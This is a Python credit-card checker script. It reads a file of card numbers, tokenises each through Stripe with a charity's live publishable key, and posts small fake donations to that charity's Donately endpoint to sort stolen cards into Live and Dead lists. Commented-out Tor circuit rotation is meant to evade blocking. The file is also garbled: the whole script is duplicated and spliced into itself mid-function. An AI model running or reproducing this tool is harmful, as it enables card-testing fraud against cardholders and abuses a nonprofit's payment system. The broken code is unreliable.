import requests , re , random , datetime , os , sys

# from stem import Signal
# from stem.control import Controller

# def new_ip():
# 	with Controller.from_port(port=9051) as controller:
# 		controller.authenticate(password='0183686454')
# 		controller.signal(Signal.NEWNYM)


if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''


def randomname():
	global FNaMe
	global LNaMe
	ListNames = []

	with open('listnames.txt' , 'r') as listfile:
		x = listfile.read()
		lista = x.split('\n')
		for i in lista:

			lista2 = i.split(' ')
			for i in lista2:
				if len(i) > 3:
					ListNames.append(i)
				else:
					continue
	random.shuffle(ListNames) 
		
	FNaMe = random.sample(ListNames , 1)
	LNaMe = random.sample(ListNames , 1)
	NameMail = FNaMe[0] + LNaMe[0] +  str(random.randint(30,3000))	
	
import requests , re , random , datetime , os , sys

# from stem import Signal
# from stem.control import Controller

# def new_ip():
# 	with Controller.from_port(port=9051) as controller:
# 		controller.authenticate(password='0183686454')
# 		controller.signal(Signal.NEWNYM)


if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''


def randomname():
	global FNaMe
	global LNaMe
	ListNames = []

	with open('listnames.txt' , 'r') as listfile:
		x = listfile.read()
		lista = x.split('\n')
		for i in lista:

			lista2 = i.split(' ')
			for i in lista2:
				if len(i) > 3:
					ListNames.append(i)
				else:
					continue
	random.shuffle(ListNames) 
		
	FNaMe = random.sample(ListNames , 1)
	LNaMe = random.sample(ListNames , 1)
	NameMail = FNaMe[0] + LNaMe[0] +  str(random.randint(30,3000))	
	

	return NameMail


session = requests.session()
#session.proxies = {'https':'socks5://127.0.0.1:9050'}

def packet1(cc,cvc,month,year):


	header =  {
	'Host': 'api.stripe.com',
	'Connection': 'close',
	# Content-Length: 576
	'Accept': 'application/json',
	'Origin': 'https://js.stripe.com',
	'User-Agent': 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Referer': 'https://js.stripe.com/v3/controller-e95e5e5c105cc5003188705b07dba6c3.html',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,id;q=0.8'

	}

	payload = 'card[name]=' + FNaMe[0] +'+' + LNaMe[0] +'&card[address_line1]=4394++Bluff+Street&card[address_line2]=&card[address_city]=Adelphi&card[address_state]=MD&card[address_zip]=20783&card[address_country]=US&card[number]='+ cc +'&card[cvc]='+ cvc +'&card[exp_month]='+ month +'&card[exp_year]='+ year +'&guid=NA&muid=73b4efaa-a3cc-4103-8f22-6f299ecedccc&sid=91f11270-6028-4226-8ae1-52e03367a949&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https%3A%2F%2Fwww.coloradovillagecollaborative.org%2Fdonate-buildthemovement%2F&key=pk_live_yFrAUplguQnSzETRYRf49zJw&pasted_fields=number%2Ccvc'

	res = session.post('https://api.stripe.com/v1/tokens', data=payload, headers=header)

	# print(res.text)

	patternToken = re.compile('"id": "(tok_\w+?)"')
	search = patternToken.search(res.text)
	if search:
		tokena = search.group(1)

	patterCard = re.compile(r'"id": "(card_\w+)"')
	searchcard = patterCard.search(res.text)
	if searchcard:
		card_id = searchcard.group(1)
	patternIP = re.compile(r'"client_ip": "(\S+)"')
	searchIP = patternIP.search(res.text)
	if searchIP:
		IP = searchIP.group(1)

	return  tokena, card_id , IP
	# print(token , card_id , IP)




# print(token)

def packet2():
	header = {

	'Host': 'api.donately.com',
	'Connection': 'close',
	# 'Content-Length': 849
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'Origin': 'https://www.coloradovillagecollaborative.org',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Referer': 'https://www.coloradovillagecollaborative.org/support-us',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
	}

	payload = 'donation_type=cc&account_id=act_659b6d6e7ec8&campaign_id=0&fundraiser_id=0&dont_send_receipt_email=false&first_name='+ FNaMe[0] +'&last_name=' + LNaMe[0] +'&email='+ '3iyudgc7pce%40thrubay.com' +'&amount_in_cents=1106&recurring=false&phone_number=301-775-6708&street_address=4394++Bluff+Street&street_address_2=&city=Adelphi&state=MD&zip_code=20783&country=US&comment=&on_behalf_of=&anonymous=true&dump=&meta_data={"base-amount":1000,"donor-pays-fees":106}&referrer_id=&stripe_token='+token +'&security={"address_line1_check":"unchecked","address_zip_check":"unchecked","cvc_check":"unchecked","card_id":"'+ card_id +'","funding":"credit","country":"IN","client_ip":"'+ip + '","livemode":true,"type":"card"}'
	res2  = session.post('https://api.donately.com/v2/donations.json' , headers=header , data=payload)
	# print(res2.text)
	return res2.text


# print(email)
print()

print(G + r'''
  ______   ______          ______  __    __   __  ___ 
 /      | /      |        /      ||  |  |  | |  |/  / 
|  ,----'|  ,----' ______|  ,----'|  |__|  | |  '  /  
|  |     |  |     |______|  |     |   __   | |    <   
|  `----.|  `----.       |  `----.|  |  |  | |  .  \  
 \______| \______|        \______||__|  |__| |__|\__\ 
                                                      
''')

print()
print(R + '[X] WRITE THE NAME OF FILE CONTAINING CREDIT CARDS ... ')

print(G + '[X] NAME :>> ' , end='')

inputt = input()

file = open(inputt)

readf = file.read()

lista = readf.split('\n')

cc = []
cvc = []
month = []
year = []


patterncc = re.compile(r'(\d{16})\|')
patterncvc = re.compile(r'\|(\d{3})$')
patternmonth = re.compile(r'\|(\d{2})\|')
patternyaer = re.compile(r'\|\d{2}(\d{2})\|')


for i in lista:
	if i.isspace() or '|' not in i :
		continue
	
	searchcc = patterncc.search(i)
	cc.append(searchcc.group(1))
	searchcvc = patterncvc.search(i)
	cvc.append(searchcvc.group(1))
	searchmonth = patternmonth.search(i)
	month.append(searchmonth.group(1))
	searchyear = patternyaer.search(i)
	if searchyear:
		
		year.append(searchyear.group(1))
	elif not searchyear:
		patternyaer = re.compile(r'\|(\d{2})')

		searchyear = patternyaer.findall(i)
		# print(searchyear)
		year.append(searchyear[1])


# print(cc)
# print(cvc)
# print(month)
# print(year)

Live = []
Dead = []
x = 1
for i in range(len(cc)):

	#if x == 20:
	#	new_ip()


	print(G + '[!] [%s/%s] CHECKING : '%( i +1 , len(cc)) , W + cc[i] ,  month[i], year[i] , cvc[i] ,' ... ' , end='' , flush=True)

	email = randomname() + '@yahoo.com'

	token , card_id , ip = packet1(cc[i] , cvc[i], month[i] , year[i])


	response  = packet2()

	patternres = re.compile(r'"message":"(.+?)"')

	searchres = patternres.search(response)

	if searchres:
		mess = searchres.group(1)

	stra = cc[i]+ '|' +month[i]+ '|'+ year[i]+ '|'+ cvc[i]
	if '"type":"bad_request","message":"' in response or '"type":"forbidden","message"' in response:
		print(R + '[x] DIE' , mess)
		Dead.append(stra)
	else:
		print(G + '[$] LIVE')
		Live.append(stra)
	x +=1

Name = str(datetime.datetime.now())

os.makedirs('OUTPUT' , exist_ok=True)

os.chdir('OUTPUT')

os.makedirs(Name)
os.chdir(Name)

with open('Live.txt' , 'w') as file:
	for i in Live:
		file.write(i + '\n')

with open('Dead.txt' , 'w') as file:
	for i in Dead:
		file.write(i+'\n') 

print(G + '[X] THE RESULTS HAVE BEEN SAVED IN [ %s ]' % (Name))

	return NameMail


session = requests.session()
#session.proxies = {'https':'socks5://127.0.0.1:9050'}

def packet1(cc,cvc,month,year):


	header =  {
	'Host': 'api.stripe.com',
	'Connection': 'close',
	# Content-Length: 576
	'Accept': 'application/json',
	'Origin': 'https://js.stripe.com',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Referer': 'https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'

	}

	payload = 'card[name]=' + FNaMe[0] +'+' + LNaMe[0] +'&card[address_line1]=4394++Bluff+Street&card[address_line2]=&card[address_city]=Adelphi&card[address_state]=MD&card[address_zip]=20783&card[address_country]=US&card[number]='+ cc +'&card[cvc]='+ cvc +'&card[exp_month]='+ month +'&card[exp_year]='+ year +'&guid=NA&muid=73b4efaa-a3cc-4103-8f22-6f299ecedccc&sid=91f11270-6028-4226-8ae1-52e03367a949&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https%3A%2F%2Fwww.coloradovillagecollaborative.org%2Fdonate-buildthemovement%2F&key=pk_live_yFrAUplguQnSzETRYRf49zJw&pasted_fields=number%2Ccvc'

	res = session.post('https://api.stripe.com/v1/tokens', data=payload, headers=header)

	# print(res.text)

	patternToken = re.compile('"id": "(tok_\w+?)"')
	search = patternToken.search(res.text)
	if search:
		tokena = search.group(1)

	patterCard = re.compile(r'"id": "(card_\w+)"')
	searchcard = patterCard.search(res.text)
	if searchcard:
		card_id = searchcard.group(1)
	patternIP = re.compile(r'"client_ip": "(\S+)"')
	searchIP = patternIP.search(res.text)
	if searchIP:
		IP = searchIP.group(1)

	return  tokena, card_id , IP
	# print(token , card_id , IP)




# print(token)

def packet2():
	header = {

	'Host': 'api.donately.com',
	'Connection': 'close',
	# 'Content-Length': 849
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'Origin': 'https://www.coloradovillagecollaborative.org',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36',
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'Referer': 'https://www.coloradovillagecollaborative.org/donate-buildthemovement/',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
	}

	payload = 'donation_type=cc&account_id=act_659b6d6e7ec8&campaign_id=6404&fundraiser_id=0&dont_send_receipt_email=false&first_name='+ FNaMe[0] +'&last_name=' + LNaMe[0] +'&email='+ '3iyudgc7pce%40thrubay.com' +'&amount_in_cents=1106&recurring=false&phone_number=301-775-6708&street_address=4394++Bluff+Street&street_address_2=&city=Adelphi&state=MD&zip_code=20783&country=US&comment=&on_behalf_of=&anonymous=true&dump=&meta_data={"base-amount":1000,"donor-pays-fees":106}&referrer_id=&stripe_token='+token +'&security={"address_line1_check":"unchecked","address_zip_check":"unchecked","cvc_check":"unchecked","card_id":"'+ card_id +'","funding":"credit","country":"IN","client_ip":"'+ip + '","livemode":true,"type":"card"}'
	res2  = session.post('https://api.donately.com/v2/donations.json' , headers=header , data=payload)
	# print(res2.text)
	return res2.text


# print(email)
print()

print(G + r'''
  ______   ______          ______  __    __   __  ___ 
 /      | /      |        /      ||  |  |  | |  |/  / 
|  ,----'|  ,----' ______|  ,----'|  |__|  | |  '  /  
|  |     |  |     |______|  |     |   __   | |    <   
|  `----.|  `----.       |  `----.|  |  |  | |  .  \  
 \______| \______|        \______||__|  |__| |__|\__\ 
                                                      
''')

print()
print(R + '[X] WRITE THE NAME OF FILE CONTAINING CREDIT CARDS ... ')

print(G + '[X] NAME :>> ' , end='')

inputt = input()

file = open(inputt)

readf = file.read()

lista = readf.split('\n')

cc = []
cvc = []
month = []
year = []


patterncc = re.compile(r'(\d{16})\|')
patterncvc = re.compile(r'\|(\d{3})$')
patternmonth = re.compile(r'\|(\d{2})\|')
patternyaer = re.compile(r'\|\d{2}(\d{2})\|')


for i in lista:
	if i.isspace() or '|' not in i :
		continue
	
	searchcc = patterncc.search(i)
	cc.append(searchcc.group(1))
	searchcvc = patterncvc.search(i)
	cvc.append(searchcvc.group(1))
	searchmonth = patternmonth.search(i)
	month.append(searchmonth.group(1))
	searchyear = patternyaer.search(i)
	if searchyear:
		
		year.append(searchyear.group(1))
	elif not searchyear:
		patternyaer = re.compile(r'\|(\d{2})')

		searchyear = patternyaer.findall(i)
		# print(searchyear)
		year.append(searchyear[1])


# print(cc)
# print(cvc)
# print(month)
# print(year)

Live = []
Dead = []
x = 1
for i in range(len(cc)):

	#if x == 20:
	#	new_ip()


	print(G + '[!] [%s/%s] CHECKING : '%( i +1 , len(cc)) , W + cc[i] ,  month[i], year[i] , cvc[i] ,' ... ' , end='' , flush=True)

	email = randomname() + '@yahoo.com'

	token , card_id , ip = packet1(cc[i] , cvc[i], month[i] , year[i])


	response  = packet2()

	patternres = re.compile(r'"message":"(.+?)"')

	searchres = patternres.search(response)

	if searchres:
		mess = searchres.group(1)

	stra = cc[i]+ '|' +month[i]+ '|'+ year[i]+ '|'+ cvc[i]
	if '"type":"bad_request","message":"' in response or '"type":"forbidden","message"' in response:
		print(R + '[x] DIE' , mess)
		Dead.append(stra)
	else:
		print(G + '[$] LIVE')
		Live.append(stra)
	x +=1

Name = str(datetime.datetime.now())

os.makedirs('OUTPUT' , exist_ok=True)

os.chdir('OUTPUT')

os.makedirs(Name)
os.chdir(Name)

with open('Live.txt' , 'w') as file:
	for i in Live:
		file.write(i + '\n')

with open('Dead.txt' , 'w') as file:
	for i in Dead:
		file.write(i+'\n') 

print(G + '[X] THE RESULTS HAVE BEEN SAVED IN [ %s ]' % (Name))
